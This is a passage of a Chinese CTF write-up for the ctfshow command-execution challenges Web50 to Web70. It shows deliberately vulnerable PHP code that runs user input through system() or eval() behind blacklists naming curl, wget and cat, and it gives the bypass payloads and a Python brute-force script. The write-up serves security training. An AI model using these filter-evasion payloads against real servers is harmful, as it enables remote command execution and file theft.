title="Web50"></a>Web50</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了x09 x26</p><p>%09不能用了换成&lt; </p><p>nl不支持通配符使用引号分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了tac</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了 &lt; &gt;</p><p>这里把&lt; 换成 <code>$IFS</code></p><p>这里有个坑 flag.php是空的真正的flag在根目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fl&#x27;&#x27;ag||</span><br></pre></td></tr></table></figure><h2 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>直接执行不需要||</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fl&#x27;&#x27;ag.php</span><br></pre></td></tr></table></figure><h2 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>彻底过滤了通配符* 用 多个?代替</p><p>nl也被过滤了</p><p>可以使用uniq代替nl</p><blockquote><p>uniq在linux中用来去重 同时也会将去重后的文件内容显示出来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><p>其他姿势</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以使用<span class="built_in">mv</span>将flag.php文件移动到其他文件 然后访问文件拿到flag</span></span><br><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用执行文件目录+?来绕过被过滤的命令</span></span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h2 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了 字母、分号、反引号、”%09”、”%26”和 &lt;&gt;</p><h3 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h3><p>同样是利用bin目录</p><blockquote><p>bin为binary的简写，主要放置系统的必备执行文件，例如:<br>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。 </p></blockquote><p>使用base64对flag.php进行加密 同时使用?绕过字母的限制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64%20????.???  # /bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>base64解密拿到flag</p><h3 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h3><p>利用&#x2F;usr&#x2F;bin目录</p><blockquote><p>&#x2F;usr&#x2F;sbin 放置一些用户安装的系统管理的必备程式。</p><p>例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</p></blockquote><p>利用bzip2命令把flag.php给压缩然后访问flag.php.bz2下载压缩包 然后解压拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????????  # /usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure><h2 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>字母和数字都被过滤了</p><p>这里利用无字母RCE </p><p>参考P牛的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p>先构造一个post文件上传包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交1.php抓包</p><p><img src="/posts/999021e8/image-20220329151337441.png" alt="ctfshow命令执行56"></p><p>使用重发器发包拿到flag</p><p>还有师傅写了python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里利用 $(( ))与整数运算。想办法构造出36.</p><blockquote><p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p><p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p><p>可以使用<code>$</code>获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p><p>可以在 (( )) 前面加上<code>$</code>符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p><p>注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p></blockquote><p><img src="/posts/999021e8/image-20220329163510711.png" alt="image-20220329163510711"></p><p><img src="/posts/999021e8/image-20220329163742001.png" alt="image-20220329163742001"></p><p><code>$(())</code>是0</p><p><code>$((~$(())))</code>是-1</p><p><code>$(($((~$(())))$((~$(())))))</code>是-2</p><p>这里需要构造36</p><p>也就是要先构造出-37 然后取反</p><p>-37是37个<code>$((~$(())))</code>相加</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><h2 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题因为disable_functions禁用了system exec popen passthru </p><p>使用读文件函数拿flag</p><blockquote><p>file_get_contents()<br>highlight_file()<br>show_source()<br>fgets()<br>file()<br>readfile()</p></blockquote><p>没有过滤直接用</p><p>注意post提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload1</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#payload2</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">#payload3</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>))&#123;<span class="keyword">echo</span> <span class="variable">$b</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h2><p>过滤了更多函数</p><blockquote><p>这些还可以用</p><p>highlight_file()<br>show_source()<br>fgets()<br>file()</p></blockquote><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在源代码</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> =<span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h2><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>奇淫技巧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过复制，重命名读取php文件内容  </span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);         </span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line"><span class="comment">#访问flag.txt </span></span><br></pre></td></tr></table></figure><h2 id="Web61-65"><a href="#Web61-65" class="headerlink" title="Web61-65"></a>Web61-65</h2><p>Web58和Web60 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web66-67"><a href="#Web66-67" class="headerlink" title="Web66-67"></a>Web66-67</h2><p>flag的位置变到了根目录</p><p>show_source()函数被禁用了换成highlight_file()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>)); <span class="comment">#查看根目录文件 print_r被过滤可以换var_dump</span></span><br><span class="line"><span class="comment"># 注意根目录是flag.txt</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h2><p>读文件的所有函数都不能用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>)); <span class="comment"># flag还是在根目录下</span></span><br><span class="line"><span class="comment"># 利用文件包含inculde()读取flag</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web69-70"><a href="#Web69-70" class="headerlink" title="Web69-70"></a>Web69-70</h2><p>var_dump()被禁用了只能使用遍历数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多种遍历数组姿势</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;---&quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 2 glob() 函数返回匹配指定模式的文件名或目录。返回的是数组</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   